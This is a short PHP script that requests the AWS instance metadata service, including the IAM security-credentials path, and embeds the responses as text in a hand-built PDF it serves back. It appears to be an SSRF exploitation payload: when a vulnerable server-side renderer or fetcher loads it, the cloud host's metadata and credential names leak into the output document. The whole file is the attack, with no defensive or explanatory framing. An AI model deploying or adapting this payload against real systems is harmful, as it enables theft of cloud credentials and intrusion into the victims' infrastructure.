<?php
// Fetch AWS metadata
$metadata = file_get_contents('http://169.254.169.254/latest/meta-data/');
$credentials = file_get_contents('http://169.254.169.254/latest/meta-data/iam/security-credentials/');

// Create a minimal PDF with metadata as text
$pdf = "%PDF-1.4\n";
$pdf .= "1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n";
$pdf .= "2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n";
$pdf .= "3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj\n";
$pdf .= "4 0 obj<</Length " . strlen($metadata . "\n" . $credentials) . ">>stream\n";
$pdf .= "BT /F1 12 Tf 100 700 Td\n";
$pdf .= "(" . addslashes($metadata) . ") Tj\n";
$pdf .= "0 -20 Td (" . addslashes($credentials) . ") Tj\n";
$pdf .= "ET\nendstream\nendobj\n";
$pdf .= "xref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\n0000000206 00000 n\n";
$pdf .= "trailer<</Size 5/Root 1 0 R>>\nstartxref\n" . (strlen($pdf) + 20) . "\n%%EOF";

header('Content-Type: application/pdf');
echo $pdf;
?>
